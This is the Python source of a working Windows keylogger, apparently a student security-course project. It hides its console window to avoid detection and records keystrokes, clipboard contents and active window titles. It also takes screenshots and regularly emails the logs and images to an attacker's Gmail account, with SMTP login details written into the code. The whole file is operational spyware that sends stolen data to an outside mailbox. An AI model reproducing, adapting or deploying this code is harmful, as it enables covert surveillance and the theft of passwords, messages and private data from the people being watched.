from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.image import MIMEImage
from email import encoders
import smtplib
from pynput import keyboard
import datetime
import time
import threading # need for sending the email and still keep track of typing
import win32gui, win32con
import pyscreenshot as ImageGrab
from tkinter import Tk

letter_counter = 0
logs_file = 'my_logs.txt'
screenshot_file = 'my_screenshots'
caps_lock_on = False
app = ""
pages_visited = 0
screenshot_name_list = []
previous_clipboard = ""


# this is used to make the keylogger run in the background to help avoid detection
program_hide = win32gui.GetForegroundWindow()
win32gui.ShowWindow(program_hide , win32con.SW_HIDE)

def screenshot():
    screenshot_images = ImageGrab.grab()
    # used to make new image names unique
    suffix = datetime.datetime.now().strftime("%y%m%d_%H%M%S")
    filename = "_".join([screenshot_file, suffix])
    filename = filename + '.png'
    # append current screenshots taken to a list so when sending email can loop through list
    # and obtain all the current screenshots
    screenshot_name_list.append(filename)
    screenshot_images.save(filename)

def on_press(key):
    global letter_counter, app, pages_visited, previous_clipboard
    # clear the file after sending to email so new file
    # does not contain old information
    if letter_counter == 0:
        open(logs_file, "w").close()
    letter_counter += 1
    # append keys to new file
    f = open(logs_file, "a")
    current_app = win32gui.GetWindowText(win32gui.GetForegroundWindow()) # this tells me where the current window is
    # have the key formated to what i want
    filter_key = key_filter(key)

    # get clipboard
    current_clipboard = Tk().clipboard_get()
    if previous_clipboard != current_clipboard:
        f.write('\nCurrent clipboard data \n' + current_clipboard + '\n') 
    previous_clipboard = current_clipboard

    # check current page/software to provide information to what pages the victim are using
    if current_app != app:
        pages_visited += 1
        send_screenshot_with_thread = threading.Thread(target = screenshot)
        send_screenshot_with_thread.start()
        current_data = "\n{Current software running: " + current_app + "}\n\n"
        app = current_app
        f.write(current_data)
    
    # send logs and screenshots to the attacker when either 100 letters has been typed or at least 5 pages are visited
    if letter_counter > 100 or pages_visited > 5:
        letter_counter = 0
        pages_visited = 0
        # be able to still keep track of the keys being logged while
        # email is being sent
        send_email_with_thread = threading.Thread(target = send_email)
        send_email_with_thread.start()
    f.write(filter_key)
    f.close()
    

def send_email():
    sender_email = "hackercomp6841kek@gmail.com"
    receiver_email = "handoverthecodes@gmail.com"
    password_sender_email = "COMP_6841"
    log_time = datetime.datetime.now()
    
    email_message = "This is targets newest information as of: " + str(log_time.strftime("%c")) + " good sir .. continue to conduct sneaky business"
    message = MIMEMultipart()
    message['From'] = sender_email
    message['To'] = receiver_email
    message['Subject'] = 'new logs acquired'
    
    message.attach(MIMEText(email_message, 'plain'))

    #attack the logs to the email
    logs_file_email = open(logs_file, 'rb')
    my_file_logs_info = MIMEBase('application', 'octate-stream')
    my_file_logs_info.set_payload((logs_file_email).read())
    logs_file_email.close()

    message.attach(my_file_logs_info)

    # load all the screenshots into the email
    for screenshot in range(len(screenshot_name_list)):
        screenshot_file_email = open(screenshot_name_list[screenshot], 'rb')
        images = MIMEImage(screenshot_file_email.read())
        images.add_header('image', screenshot_name_list[screenshot])
        screenshot_file_email.close()
        #attach the images to the email
        message.attach(images)
    
    # clear screenshot list so old screenshots are not being sent
    screenshot_name_list.clear()

    process_email = smtplib.SMTP('smtp.gmail.com', 587)
    process_email.starttls()
    process_email.login(sender_email, password_sender_email) #login with mail_id and password
    
    text = message.as_string()
    process_email.sendmail(sender_email, receiver_email, text)
    process_email.quit()
    print('Email sent')

def on_release(key):
    if key == keyboard.Key.esc:
        return False

def key_filter(key):
    # sorry no switch statements on python :( bless this mess
    global caps_lock_on
    if key == keyboard.Key.space:
        key = '\n'
    elif key == keyboard.Key.backspace:
        key = '[backspace key]'
    elif key == keyboard.Key.esc:
        key = '[esc key]'
    elif key == keyboard.Key.ctrl_l:
        key = '[control key]'
    elif key == keyboard.Key.shift:
        key = ''
    elif key == keyboard.Key.shift_r:
        key = ''
    elif key == keyboard.Key.enter:
        # everytime enter is pressed give current time
        x = datetime.datetime.now()
        key = '[enter key]: ' + str(x.strftime("%c")) + '\n'
    elif key == keyboard.Key.up:
        key = '[up key]'
    elif key == keyboard.Key.left:
        key = '[left key]'
    elif key == keyboard.Key.right:
        key = '[right key]'
    elif key == keyboard.Key.down:
        key = '[down key]'
    elif key == keyboard.Key.caps_lock:
        # keep track if target has caps log on/off
        if caps_lock_on == False:
            key = 'caps lock on\n'
            caps_lock_on = True
        elif caps_lock_on == True:
            key = 'caps lock off\n'
            caps_lock_on = False
    
    filtered_key = str(key).replace("'","")
    
    return filtered_key

with keyboard.Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()

listener = keyboard.Listener(on_press = on_press, on_release = on_release)
listener.start()


#sources used:
# https://realpython.com/python-send-email/ 
# https://pypi.org/project/pynput/
# https://www.tutorialspoint.com/send-mail-with-attachment-from-your-gmail-account-using-python
# https://www.w3schools.com/python/python_file_handling.asp
# https://www.programcreek.com/python/example/81370/win32gui.GetForegroundWindow
# https://stackoverflow.com/questions/764631/how-to-hide-console-window-in-python 
# https://stackoverflow.com/questions/10501247/best-way-to-generate-random-file-names-in-python 
# https://stackoverflow.com/questions/101128/how-do-i-read-text-from-the-clipboard